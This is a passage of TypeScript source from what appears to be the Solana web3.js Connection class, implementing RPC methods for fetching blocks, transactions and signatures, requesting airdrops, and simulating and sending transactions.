no-dupe-class-members\n  async getBlock(\n    slot: number,\n    rawConfig: GetVersionedBlockConfig & {transactionDetails: 'accounts'},\n  ): Promise<VersionedAccountsModeBlockResponse | null>;\n\n  // eslint-disable-next-line no-dupe-class-members\n  async getBlock(\n    slot: number,\n    rawConfig: GetVersionedBlockConfig & {transactionDetails: 'none'},\n  ): Promise<VersionedNoneModeBlockResponse | null>;\n\n  /**\n   * Fetch a processed block from the cluster.\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  async getBlock(\n    slot: number,\n    rawConfig?: GetVersionedBlockConfig,\n  ): Promise<\n    | VersionedBlockResponse\n    | VersionedAccountsModeBlockResponse\n    | VersionedNoneModeBlockResponse\n    | null\n  > {\n    const {commitment, config} = extractCommitmentFromConfig(rawConfig);\n    const args = this._buildArgsAtLeastConfirmed(\n      [slot],\n      commitment as Finality,\n      undefined /* encoding */,\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getBlock', args);\n    try {\n      switch (config?.transactionDetails) {\n        case 'accounts': {\n          const res = create(unsafeRes, GetAccountsModeBlockRpcResult);\n          if ('error' in res) {\n            throw res.error;\n          }\n          return res.result;\n        }\n        case 'none': {\n          const res = create(unsafeRes, GetNoneModeBlockRpcResult);\n          if ('error' in res) {\n            throw res.error;\n          }\n          return res.result;\n        }\n        default: {\n          const res = create(unsafeRes, GetBlockRpcResult);\n          if ('error' in res) {\n            throw res.error;\n          }\n          const {result} = res;\n          return result\n            ? {\n                ...result,\n                transactions: result.transactions.map(\n                  ({transaction, meta, version}) => ({\n                    meta,\n                    transaction: {\n                      ...transaction,\n                      message: versionedMessageFromResponse(\n                        version,\n                        transaction.message,\n                      ),\n                    },\n                    version,\n                  }),\n                ),\n              }\n            : null;\n        }\n      }\n    } catch (e) {\n      throw new SolanaJSONRPCError(\n        e as JSONRPCError,\n        'failed to get confirmed block',\n      );\n    }\n  }\n\n  /**\n   * Fetch parsed transaction details for a confirmed or finalized block\n   */\n  async getParsedBlock(\n    slot: number,\n    rawConfig?: GetVersionedBlockConfig,\n  ): Promise<ParsedAccountsModeBlockResponse>;\n\n  // eslint-disable-next-line no-dupe-class-members\n  async getParsedBlock(\n    slot: number,\n    rawConfig: GetVersionedBlockConfig & {transactionDetails: 'accounts'},\n  ): Promise<ParsedAccountsModeBlockResponse>;\n\n  // eslint-disable-next-line no-dupe-class-members\n  async getParsedBlock(\n    slot: number,\n    rawConfig: GetVersionedBlockConfig & {transactionDetails: 'none'},\n  ): Promise<ParsedNoneModeBlockResponse>;\n  // eslint-disable-next-line no-dupe-class-members\n  async getParsedBlock(\n    slot: number,\n    rawConfig?: GetVersionedBlockConfig,\n  ): Promise<\n    | ParsedBlockResponse\n    | ParsedAccountsModeBlockResponse\n    | ParsedNoneModeBlockResponse\n    | null\n  > {\n    const {commitment, config} = extractCommitmentFromConfig(rawConfig);\n    const args = this._buildArgsAtLeastConfirmed(\n      [slot],\n      commitment as Finality,\n      'jsonParsed',\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getBlock', args);\n    try {\n      switch (config?.transactionDetails) {\n        case 'accounts': {\n          const res = create(unsafeRes, GetParsedAccountsModeBlockRpcResult);\n          if ('error' in res) {\n            throw res.error;\n          }\n          return res.result;\n        }\n        case 'none': {\n          const res = create(unsafeRes, GetParsedNoneModeBlockRpcResult);\n          if ('error' in res) {\n            throw res.error;\n          }\n          return res.result;\n        }\n        default: {\n          const res = create(unsafeRes, GetParsedBlockRpcResult);\n          if ('error' in res) {\n            throw res.error;\n          }\n          return res.result;\n        }\n      }\n    } catch (e) {\n      throw new SolanaJSONRPCError(e as JSONRPCError, 'failed to get block');\n    }\n  }\n\n  /*\n   * Returns the current block height of the node\n   */\n  getBlockHeight = (() => {\n    const requestPromises: {[hash: string]: Promise<number>} = {};\n    return async (\n      commitmentOrConfig?: Commitment | GetBlockHeightConfig,\n    ): Promise<number> => {\n      const {commitment, config} =\n        extractCommitmentFromConfig(commitmentOrConfig);\n      const args = this._buildArgs(\n        [],\n        commitment,\n        undefined /* encoding */,\n        config,\n      );\n      const requestHash = fastStableStringify(args);\n      requestPromises[requestHash] =\n        requestPromises[requestHash] ??\n        (async () => {\n          try {\n            const unsafeRes = await this._rpcRequest('getBlockHeight', args);\n            const res = create(unsafeRes, jsonRpcResult(number()));\n            if ('error' in res) {\n              throw new SolanaJSONRPCError(\n                res.error,\n                'failed to get block height information',\n              );\n            }\n            return res.result;\n          } finally {\n            delete requestPromises[requestHash];\n          }\n        })();\n      return await requestPromises[requestHash];\n    };\n  })();\n\n  /*\n   * Returns recent block production information from the current or previous epoch\n   */\n  async getBlockProduction(\n    configOrCommitment?: GetBlockProductionConfig | Commitment,\n  ): Promise<RpcResponseAndContext<BlockProduction>> {\n    let extra: Omit<GetBlockProductionConfig, 'commitment'> | undefined;\n    let commitment: Commitment | undefined;\n\n    if (typeof configOrCommitment === 'string') {\n      commitment = configOrCommitment;\n    } else if (configOrCommitment) {\n      const {commitment: c, ...rest} = configOrCommitment;\n      commitment = c;\n      extra = rest;\n    }\n\n    const args = this._buildArgs([], commitment, 'base64', extra);\n    const unsafeRes = await this._rpcRequest('getBlockProduction', args);\n    const res = create(unsafeRes, BlockProductionResponseStruct);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get block production information',\n      );\n    }\n\n    return res.result;\n  }\n\n  /**\n   * Fetch a confirmed or finalized transaction from the cluster.\n   *\n   * @deprecated Instead, call `getTransaction` using a\n   * `GetVersionedTransactionConfig` by setting the\n   * `maxSupportedTransactionVersion` property.\n   */\n  async getTransaction(\n    signature: string,\n    rawConfig?: GetTransactionConfig,\n  ): Promise<TransactionResponse | null>;\n\n  /**\n   * Fetch a confirmed or finalized transaction from the cluster.\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  async getTransaction(\n    signature: string,\n    rawConfig: GetVersionedTransactionConfig,\n  ): Promise<VersionedTransactionResponse | null>;\n\n  /**\n   * Fetch a confirmed or finalized transaction from the cluster.\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  async getTransaction(\n    signature: string,\n    rawConfig?: GetVersionedTransactionConfig,\n  ): Promise<VersionedTransactionResponse | null> {\n    const {commitment, config} = extractCommitmentFromConfig(rawConfig);\n    const args = this._buildArgsAtLeastConfirmed(\n      [signature],\n      commitment as Finality,\n      undefined /* encoding */,\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getTransaction', args);\n    const res = create(unsafeRes, GetTransactionRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get transaction');\n    }\n\n    const result = res.result;\n    if (!result) return result;\n\n    return {\n      ...result,\n      transaction: {\n        ...result.transaction,\n        message: versionedMessageFromResponse(\n          result.version,\n          result.transaction.message,\n        ),\n      },\n    };\n  }\n\n  /**\n   * Fetch parsed transaction details for a confirmed or finalized transaction\n   */\n  async getParsedTransaction(\n    signature: TransactionSignature,\n    commitmentOrConfig?: GetVersionedTransactionConfig | Finality,\n  ): Promise<ParsedTransactionWithMeta | null> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgsAtLeastConfirmed(\n      [signature],\n      commitment as Finality,\n      'jsonParsed',\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getTransaction', args);\n    const res = create(unsafeRes, GetParsedTransactionRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get transaction');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch parsed transaction details for a batch of confirmed transactions\n   */\n  async getParsedTransactions(\n    signatures: TransactionSignature[],\n    commitmentOrConfig?: GetVersionedTransactionConfig | Finality,\n  ): Promise<(ParsedTransactionWithMeta | null)[]> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const batch = signatures.map(signature => {\n      const args = this._buildArgsAtLeastConfirmed(\n        [signature],\n        commitment as Finality,\n        'jsonParsed',\n        config,\n      );\n      return {\n        methodName: 'getTransaction',\n        args,\n      };\n    });\n\n    const unsafeRes = await this._rpcBatchRequest(batch);\n    const res = unsafeRes.map((unsafeRes: any) => {\n      const res = create(unsafeRes, GetParsedTransactionRpcResult);\n      if ('error' in res) {\n        throw new SolanaJSONRPCError(res.error, 'failed to get transactions');\n      }\n      return res.result;\n    });\n\n    return res;\n  }\n\n  /**\n   * Fetch transaction details for a batch of confirmed transactions.\n   * Similar to {@link getParsedTransactions} but returns a {@link TransactionResponse}.\n   *\n   * @deprecated Instead, call `getTransactions` using a\n   * `GetVersionedTransactionConfig` by setting the\n   * `maxSupportedTransactionVersion` property.\n   */\n  async getTransactions(\n    signatures: TransactionSignature[],\n    commitmentOrConfig?: GetTransactionConfig | Finality,\n  ): Promise<(TransactionResponse | null)[]>;\n\n  /**\n   * Fetch transaction details for a batch of confirmed transactions.\n   * Similar to {@link getParsedTransactions} but returns a {@link\n   * VersionedTransactionResponse}.\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  async getTransactions(\n    signatures: TransactionSignature[],\n    commitmentOrConfig: GetVersionedTransactionConfig | Finality,\n  ): Promise<(VersionedTransactionResponse | null)[]>;\n\n  /**\n   * Fetch transaction details for a batch of confirmed transactions.\n   * Similar to {@link getParsedTransactions} but returns a {@link\n   * VersionedTransactionResponse}.\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  async getTransactions(\n    signatures: TransactionSignature[],\n    commitmentOrConfig: GetVersionedTransactionConfig | Finality,\n  ): Promise<(VersionedTransactionResponse | null)[]> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const batch = signatures.map(signature => {\n      const args = this._buildArgsAtLeastConfirmed(\n        [signature],\n        commitment as Finality,\n        undefined /* encoding */,\n        config,\n      );\n      return {\n        methodName: 'getTransaction',\n        args,\n      };\n    });\n\n    const unsafeRes = await this._rpcBatchRequest(batch);\n    const res = unsafeRes.map((unsafeRes: any) => {\n      const res = create(unsafeRes, GetTransactionRpcResult);\n      if ('error' in res) {\n        throw new SolanaJSONRPCError(res.error, 'failed to get transactions');\n      }\n      const result = res.result;\n      if (!result) return result;\n\n      return {\n        ...result,\n        transaction: {\n          ...result.transaction,\n          message: versionedMessageFromResponse(\n            result.version,\n            result.transaction.message,\n          ),\n        },\n      };\n    });\n\n    return res;\n  }\n\n  /**\n   * Fetch a list of Transactions and transaction statuses from the cluster\n   * for a confirmed block.\n   *\n   * @deprecated Deprecated since RPC v1.7.0. Please use {@link getBlock} instead.\n   */\n  async getConfirmedBlock(\n    slot: number,\n    commitment?: Finality,\n  ): Promise<ConfirmedBlock> {\n    const args = this._buildArgsAtLeastConfirmed([slot], commitment);\n    const unsafeRes = await this._rpcRequest('getBlock', args);\n    const res = create(unsafeRes, GetConfirmedBlockRpcResult);\n\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get confirmed block');\n    }\n\n    const result = res.result;\n    if (!result) {\n      throw new Error('Confirmed block ' + slot + ' not found');\n    }\n\n    const block = {\n      ...result,\n      transactions: result.transactions.map(({transaction, meta}) => {\n        const message = new Message(transaction.message);\n        return {\n          meta,\n          transaction: {\n            ...transaction,\n            message,\n          },\n        };\n      }),\n    };\n\n    return {\n      ...block,\n      transactions: block.transactions.map(({transaction, meta}) => {\n        return {\n          meta,\n          transaction: Transaction.populate(\n            transaction.message,\n            transaction.signatures,\n          ),\n        };\n      }),\n    };\n  }\n\n  /**\n   * Fetch confirmed blocks between two slots\n   */\n  async getBlocks(\n    startSlot: number,\n    endSlot?: number,\n    commitment?: Finality,\n  ): Promise<Array<number>> {\n    const args = this._buildArgsAtLeastConfirmed(\n      endSlot !== undefined ? [startSlot, endSlot] : [startSlot],\n      commitment,\n    );\n    const unsafeRes = await this._rpcRequest('getBlocks', args);\n    const res = create(unsafeRes, jsonRpcResult(array(number())));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get blocks');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch a list of Signatures from the cluster for a block, excluding rewards\n   */\n  async getBlockSignatures(\n    slot: number,\n    commitment?: Finality,\n  ): Promise<BlockSignatures> {\n    const args = this._buildArgsAtLeastConfirmed(\n      [slot],\n      commitment,\n      undefined,\n      {\n        transactionDetails: 'signatures',\n        rewards: false,\n      },\n    );\n    const unsafeRes = await this._rpcRequest('getBlock', args);\n    const res = create(unsafeRes, GetBlockSignaturesRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get block');\n    }\n    const result = res.result;\n    if (!result) {\n      throw new Error('Block ' + slot + ' not found');\n    }\n    return result;\n  }\n\n  /**\n   * Fetch a list of Signatures from the cluster for a confirmed block, excluding rewards\n   *\n   * @deprecated Deprecated since RPC v1.7.0. Please use {@link getBlockSignatures} instead.\n   */\n  async getConfirmedBlockSignatures(\n    slot: number,\n    commitment?: Finality,\n  ): Promise<BlockSignatures> {\n    const args = this._buildArgsAtLeastConfirmed(\n      [slot],\n      commitment,\n      undefined,\n      {\n        transactionDetails: 'signatures',\n        rewards: false,\n      },\n    );\n    const unsafeRes = await this._rpcRequest('getBlock', args);\n    const res = create(unsafeRes, GetBlockSignaturesRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get confirmed block');\n    }\n    const result = res.result;\n    if (!result) {\n      throw new Error('Confirmed block ' + slot + ' not found');\n    }\n    return result;\n  }\n\n  /**\n   * Fetch a transaction details for a confirmed transaction\n   *\n   * @deprecated Deprecated since RPC v1.7.0. Please use {@link getTransaction} instead.\n   */\n  async getConfirmedTransaction(\n    signature: TransactionSignature,\n    commitment?: Finality,\n  ): Promise<ConfirmedTransaction | null> {\n    const args = this._buildArgsAtLeastConfirmed([signature], commitment);\n    const unsafeRes = await this._rpcRequest('getTransaction', args);\n    const res = create(unsafeRes, GetTransactionRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get transaction');\n    }\n\n    const result = res.result;\n    if (!result) return result;\n\n    const message = new Message(result.transaction.message);\n    const signatures = result.transaction.signatures;\n    return {\n      ...result,\n      transaction: Transaction.populate(message, signatures),\n    };\n  }\n\n  /**\n   * Fetch parsed transaction details for a confirmed transaction\n   *\n   * @deprecated Deprecated since RPC v1.7.0. Please use {@link getParsedTransaction} instead.\n   */\n  async getParsedConfirmedTransaction(\n    signature: TransactionSignature,\n    commitment?: Finality,\n  ): Promise<ParsedConfirmedTransaction | null> {\n    const args = this._buildArgsAtLeastConfirmed(\n      [signature],\n      commitment,\n      'jsonParsed',\n    );\n    const unsafeRes = await this._rpcRequest('getTransaction', args);\n    const res = create(unsafeRes, GetParsedTransactionRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get confirmed transaction',\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch parsed transaction details for a batch of confirmed transactions\n   *\n   * @deprecated Deprecated since RPC v1.7.0. Please use {@link getParsedTransactions} instead.\n   */\n  async getParsedConfirmedTransactions(\n    signatures: TransactionSignature[],\n    commitment?: Finality,\n  ): Promise<(ParsedConfirmedTransaction | null)[]> {\n    const batch = signatures.map(signature => {\n      const args = this._buildArgsAtLeastConfirmed(\n        [signature],\n        commitment,\n        'jsonParsed',\n      );\n      return {\n        methodName: 'getTransaction',\n        args,\n      };\n    });\n\n    const unsafeRes = await this._rpcBatchRequest(batch);\n    const res = unsafeRes.map((unsafeRes: any) => {\n      const res = create(unsafeRes, GetParsedTransactionRpcResult);\n      if ('error' in res) {\n        throw new SolanaJSONRPCError(\n          res.error,\n          'failed to get confirmed transactions',\n        );\n      }\n      return res.result;\n    });\n\n    return res;\n  }\n\n  /**\n   * Fetch a list of all the confirmed signatures for transactions involving an address\n   * within a specified slot range. Max range allowed is 10,000 slots.\n   *\n   * @deprecated Deprecated since RPC v1.3. Please use {@link getConfirmedSignaturesForAddress2} instead.\n   *\n   * @param address queried address\n   * @param startSlot start slot, inclusive\n   * @param endSlot end slot, inclusive\n   */\n  async getConfirmedSignaturesForAddress(\n    address: PublicKey,\n    startSlot: number,\n    endSlot: number,\n  ): Promise<Array<TransactionSignature>> {\n    let options: any = {};\n\n    let firstAvailableBlock = await this.getFirstAvailableBlock();\n    while (!('until' in options)) {\n      startSlot--;\n      if (startSlot <= 0 || startSlot < firstAvailableBlock) {\n        break;\n      }\n\n      try {\n        const block = await this.getConfirmedBlockSignatures(\n          startSlot,\n          'finalized',\n        );\n        if (block.signatures.length > 0) {\n          options.until =\n            block.signatures[block.signatures.length - 1].toString();\n        }\n      } catch (err) {\n        if (err instanceof Error && err.message.includes('skipped')) {\n          continue;\n        } else {\n          throw err;\n        }\n      }\n    }\n\n    let highestConfirmedRoot = await this.getSlot('finalized');\n    while (!('before' in options)) {\n      endSlot++;\n      if (endSlot > highestConfirmedRoot) {\n        break;\n      }\n\n      try {\n        const block = await this.getConfirmedBlockSignatures(endSlot);\n        if (block.signatures.length > 0) {\n          options.before =\n            block.signatures[block.signatures.length - 1].toString();\n        }\n      } catch (err) {\n        if (err instanceof Error && err.message.includes('skipped')) {\n          continue;\n        } else {\n          throw err;\n        }\n      }\n    }\n\n    const confirmedSignatureInfo = await this.getConfirmedSignaturesForAddress2(\n      address,\n      options,\n    );\n    return confirmedSignatureInfo.map(info => info.signature);\n  }\n\n  /**\n   * Returns confirmed signatures for transactions involving an\n   * address backwards in time from the provided signature or most recent confirmed block\n   *\n   * @deprecated Deprecated since RPC v1.7.0. Please use {@link getSignaturesForAddress} instead.\n   */\n  async getConfirmedSignaturesForAddress2(\n    address: PublicKey,\n    options?: ConfirmedSignaturesForAddress2Options,\n    commitment?: Finality,\n  ): Promise<Array<ConfirmedSignatureInfo>> {\n    const args = this._buildArgsAtLeastConfirmed(\n      [address.toBase58()],\n      commitment,\n      undefined,\n      options,\n    );\n    const unsafeRes = await this._rpcRequest(\n      'getConfirmedSignaturesForAddress2',\n      args,\n    );\n    const res = create(unsafeRes, GetConfirmedSignaturesForAddress2RpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get confirmed signatures for address',\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Returns confirmed signatures for transactions involving an\n   * address backwards in time from the provided signature or most recent confirmed block\n   *\n   *\n   * @param address queried address\n   * @param options\n   */\n  async getSignaturesForAddress(\n    address: PublicKey,\n    options?: SignaturesForAddressOptions,\n    commitment?: Finality,\n  ): Promise<Array<ConfirmedSignatureInfo>> {\n    const args = this._buildArgsAtLeastConfirmed(\n      [address.toBase58()],\n      commitment,\n      undefined,\n      options,\n    );\n    const unsafeRes = await this._rpcRequest('getSignaturesForAddress', args);\n    const res = create(unsafeRes, GetSignaturesForAddressRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get signatures for address',\n      );\n    }\n    return res.result;\n  }\n\n  async getAddressLookupTable(\n    accountKey: PublicKey,\n    config?: GetAccountInfoConfig,\n  ): Promise<RpcResponseAndContext<AddressLookupTableAccount | null>> {\n    const {context, value: accountInfo} = await this.getAccountInfoAndContext(\n      accountKey,\n      config,\n    );\n\n    let value = null;\n    if (accountInfo !== null) {\n      value = new AddressLookupTableAccount({\n        key: accountKey,\n        state: AddressLookupTableAccount.deserialize(accountInfo.data),\n      });\n    }\n\n    return {\n      context,\n      value,\n    };\n  }\n\n  /**\n   * Fetch the contents of a Nonce account from the cluster, return with context\n   */\n  async getNonceAndContext(\n    nonceAccount: PublicKey,\n    commitmentOrConfig?: Commitment | GetNonceAndContextConfig,\n  ): Promise<RpcResponseAndContext<NonceAccount | null>> {\n    const {context, value: accountInfo} = await this.getAccountInfoAndContext(\n      nonceAccount,\n      commitmentOrConfig,\n    );\n\n    let value = null;\n    if (accountInfo !== null) {\n      value = NonceAccount.fromAccountData(accountInfo.data);\n    }\n\n    return {\n      context,\n      value,\n    };\n  }\n\n  /**\n   * Fetch the contents of a Nonce account from the cluster\n   */\n  async getNonce(\n    nonceAccount: PublicKey,\n    commitmentOrConfig?: Commitment | GetNonceConfig,\n  ): Promise<NonceAccount | null> {\n    return await this.getNonceAndContext(nonceAccount, commitmentOrConfig)\n      .then(x => x.value)\n      .catch(e => {\n        throw new Error(\n          'failed to get nonce for account ' +\n            nonceAccount.toBase58() +\n            ': ' +\n            e,\n        );\n      });\n  }\n\n  /**\n   * Request an allocation of lamports to the specified address\n   *\n   * ```typescript\n   * import { Connection, PublicKey, LAMPORTS_PER_SOL } from \"@solana/web3.js\";\n   *\n   * (async () => {\n   *   const connection = new Connection(\"https://api.testnet.solana.com\", \"confirmed\");\n   *   const myAddress = new PublicKey(\"2nr1bHFT86W9tGnyvmYW4vcHKsQB3sVQfnddasz4kExM\");\n   *   const signature = await connection.requestAirdrop(myAddress, LAMPORTS_PER_SOL);\n   *   await connection.confirmTransaction(signature);\n   * })();\n   * ```\n   */\n  async requestAirdrop(\n    to: PublicKey,\n    lamports: number,\n  ): Promise<TransactionSignature> {\n    const unsafeRes = await this._rpcRequest('requestAirdrop', [\n      to.toBase58(),\n      lamports,\n    ]);\n    const res = create(unsafeRes, RequestAirdropRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `airdrop to ${to.toBase58()} failed`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * @internal\n   */\n  async _blockhashWithExpiryBlockHeight(\n    disableCache: boolean,\n  ): Promise<BlockhashWithExpiryBlockHeight> {\n    if (!disableCache) {\n      // Wait for polling to finish\n      while (this._pollingBlockhash) {\n        await sleep(100);\n      }\n      const timeSinceFetch = Date.now() - this._blockhashInfo.lastFetch;\n      const expired = timeSinceFetch >= BLOCKHASH_CACHE_TIMEOUT_MS;\n      if (this._blockhashInfo.latestBlockhash !== null && !expired) {\n        return this._blockhashInfo.latestBlockhash;\n      }\n    }\n\n    return await this._pollNewBlockhash();\n  }\n\n  /**\n   * @internal\n   */\n  async _pollNewBlockhash(): Promise<BlockhashWithExpiryBlockHeight> {\n    this._pollingBlockhash = true;\n    try {\n      const startTime = Date.now();\n      const cachedLatestBlockhash = this._blockhashInfo.latestBlockhash;\n      const cachedBlockhash = cachedLatestBlockhash\n        ? cachedLatestBlockhash.blockhash\n        : null;\n      for (let i = 0; i < 50; i++) {\n        const latestBlockhash = await this.getLatestBlockhash('finalized');\n\n        if (cachedBlockhash !== latestBlockhash.blockhash) {\n          this._blockhashInfo = {\n            latestBlockhash,\n            lastFetch: Date.now(),\n            transactionSignatures: [],\n            simulatedSignatures: [],\n          };\n          return latestBlockhash;\n        }\n\n        // Sleep for approximately half a slot\n        await sleep(MS_PER_SLOT / 2);\n      }\n\n      throw new Error(\n        `Unable to obtain a new blockhash after ${Date.now() - startTime}ms`,\n      );\n    } finally {\n      this._pollingBlockhash = false;\n    }\n  }\n\n  /**\n   * get the stake minimum delegation\n   */\n  async getStakeMinimumDelegation(\n    config?: GetStakeMinimumDelegationConfig,\n  ): Promise<RpcResponseAndContext<number>> {\n    const {commitment, config: configArg} = extractCommitmentFromConfig(config);\n    const args = this._buildArgs([], commitment, 'base64', configArg);\n    const unsafeRes = await this._rpcRequest('getStakeMinimumDelegation', args);\n    const res = create(unsafeRes, jsonRpcResultAndContext(number()));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get stake minimum delegation`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Simulate a transaction\n   *\n   * @deprecated Instead, call {@link simulateTransaction} with {@link\n   * VersionedTransaction} and {@link SimulateTransactionConfig} parameters\n   */\n  simulateTransaction(\n    transactionOrMessage: Transaction | Message,\n    signers?: Array<Signer>,\n    includeAccounts?: boolean | Array<PublicKey>,\n  ): Promise<RpcResponseAndContext<SimulatedTransactionResponse>>;\n\n  /**\n   * Simulate a transaction\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  simulateTransaction(\n    transaction: VersionedTransaction,\n    config?: SimulateTransactionConfig,\n  ): Promise<RpcResponseAndContext<SimulatedTransactionResponse>>;\n\n  /**\n   * Simulate a transaction\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  async simulateTransaction(\n    transactionOrMessage: VersionedTransaction | Transaction | Message,\n    configOrSigners?: SimulateTransactionConfig | Array<Signer>,\n    includeAccounts?: boolean | Array<PublicKey>,\n  ): Promise<RpcResponseAndContext<SimulatedTransactionResponse>> {\n    if ('message' in transactionOrMessage) {\n      const versionedTx = transactionOrMessage;\n      const wireTransaction = versionedTx.serialize();\n      const encodedTransaction =\n        Buffer.from(wireTransaction).toString('base64');\n      if (Array.isArray(configOrSigners) || includeAccounts !== undefined) {\n        throw new Error('Invalid arguments');\n      }\n\n      const config: any = configOrSigners || {};\n      config.encoding = 'base64';\n      if (!('commitment' in config)) {\n        config.commitment = this.commitment;\n      }\n\n      if (\n        configOrSigners &&\n        typeof configOrSigners === 'object' &&\n        'innerInstructions' in configOrSigners\n      ) {\n        config.innerInstructions = configOrSigners.innerInstructions;\n      }\n\n      const args = [encodedTransaction, config];\n      const unsafeRes = await this._rpcRequest('simulateTransaction', args);\n      const res = create(unsafeRes, SimulatedTransactionResponseStruct);\n      if ('error' in res) {\n        throw new Error('failed to simulate transaction: ' + res.error.message);\n      }\n      return res.result;\n    }\n\n    let transaction;\n    if (transactionOrMessage instanceof Transaction) {\n      let originalTx: Transaction = transactionOrMessage;\n      transaction = new Transaction();\n      transaction.feePayer = originalTx.feePayer;\n      transaction.instructions = transactionOrMessage.instructions;\n      transaction.nonceInfo = originalTx.nonceInfo;\n      transaction.signatures = originalTx.signatures;\n    } else {\n      transaction = Transaction.populate(transactionOrMessage);\n      // HACK: this function relies on mutating the populated transaction\n      transaction._message = transaction._json = undefined;\n    }\n\n    if (configOrSigners !== undefined && !Array.isArray(configOrSigners)) {\n      throw new Error('Invalid arguments');\n    }\n\n    const signers = configOrSigners;\n    if (transaction.nonceInfo && signers) {\n      transaction.sign(...signers);\n    } else {\n      let disableCache = this._disableBlockhashCaching;\n      for (;;) {\n        const latestBlockhash =\n          await this._blockhashWithExpiryBlockHeight(disableCache);\n        transaction.lastValidBlockHeight = latestBlockhash.lastValidBlockHeight;\n        transaction.recentBlockhash = latestBlockhash.blockhash;\n\n        if (!signers) break;\n\n        transaction.sign(...signers);\n        if (!transaction.signature) {\n          throw new Error('!signature'); // should never happen\n        }\n\n        const signature = transaction.signature.toString('base64');\n        if (\n          !this._blockhashInfo.simulatedSignatures.includes(signature) &&\n          !this._blockhashInfo.transactionSignatures.includes(signature)\n        ) {\n          // The signature of this transaction has not been seen before with the\n          // current recentBlockhash, all done. Let's break\n          this._blockhashInfo.simulatedSignatures.push(signature);\n          break;\n        } else {\n          // This transaction would be treated as duplicate (its derived signature\n          // matched to one of already recorded signatures).\n          // So, we must fetch a new blockhash for a different signature by disabling\n          // our cache not to wait for the cache expiration (BLOCKHASH_CACHE_TIMEOUT_MS).\n          disableCache = true;\n        }\n      }\n    }\n\n    const message = transaction._compile();\n    const signData = message.serialize();\n    const wireTransaction = transaction._serialize(signData);\n    const encodedTransaction = wireTransaction.toString('base64');\n    const config: any = {\n      encoding: 'base64',\n      commitment: this.commitment,\n    };\n\n    if (includeAccounts) {\n      const addresses = (\n        Array.isArray(includeAccounts)\n          ? includeAccounts\n          : message.nonProgramIds()\n      ).map(key => key.toBase58());\n\n      config['accounts'] = {\n        encoding: 'base64',\n        addresses,\n      };\n    }\n\n    if (signers) {\n      config.sigVerify = true;\n    }\n\n    if (\n      configOrSigners &&\n      typeof configOrSigners === 'object' &&\n      'innerInstructions' in configOrSigners\n    ) {\n      config.innerInstructions = configOrSigners.innerInstructions;\n    }\n\n    const args = [encodedTransaction, config];\n    const unsafeRes = await this._rpcRequest('simulateTransaction', args);\n    const res = create(unsafeRes, SimulatedTransactionResponseStruct);\n    if ('error' in res) {\n      let logs;\n      if ('data' in res.error) {\n        logs = res.error.data.logs;\n        if (logs && Array.isArray(logs)) {\n          const traceIndent = '\\n    ';\n          const logTrace = traceIndent + logs.join(traceIndent);\n          console.error(res.error.message, logTrace);\n        }\n      }\n\n      throw new SendTransactionError({\n        action: 'simulate',\n        signature: '',\n        transactionMessage: res.error.message,\n        logs: logs,\n      });\n    }\n    return res.result;\n  }\n\n  /**\n   * Sign and send a transaction\n   *\n   * @deprecated Instead, call {@link sendTransaction} with a {@link\n   * VersionedTransaction}\n   */\n  sendTransaction(\n    transaction: Transaction,\n    signers: Array<Signer>,\n    options?: SendOptions,\n  ): Promise<TransactionSignature>;\n\n  /**\n   * Send a signed transaction\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  sendTransaction(\n    transaction: VersionedTransaction,\n    options?: SendOptions,\n  ): Promise<TransactionSignature>;\n\n  /**\n   * Sign and send a transaction\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  async sendTransaction(\n    transaction: VersionedTransaction | Transaction,\n    signersOrOptions?: Array<Signer> | SendOptions,\n    options?: SendOptions,\n  ): Promise<TransactionSignature> {\n    if ('version' in transaction) {\n      if (signersOrOptions && Array.isArray(signersOrOptions)) {\n        throw new Error('Invalid arguments');\n      }\n\n      const wireTransaction = transaction.serialize();\n      return await this.sendRawTransaction(wireTransaction, signersOrOptions);\n    }\n\n    if (signersOrOptions === undefined || !Array.isArray(signersOrOptions)) {\n      throw new Error('Invalid arguments');\n    }\n\n    const signers = signersOrOptions;\n    if (transaction.nonceInfo) {\n      transaction.sign(...signers);\n    } else {\n      let disableCache = this._disableBlockhashCaching;\n      for (;;) {\n        const latestBlockhash =\n          await this._blockhashWithExpiryBlockHeight(disableCache);\n        transaction.lastValidBlockHeight = latestBlockhash.lastValidBlockHeight;\n        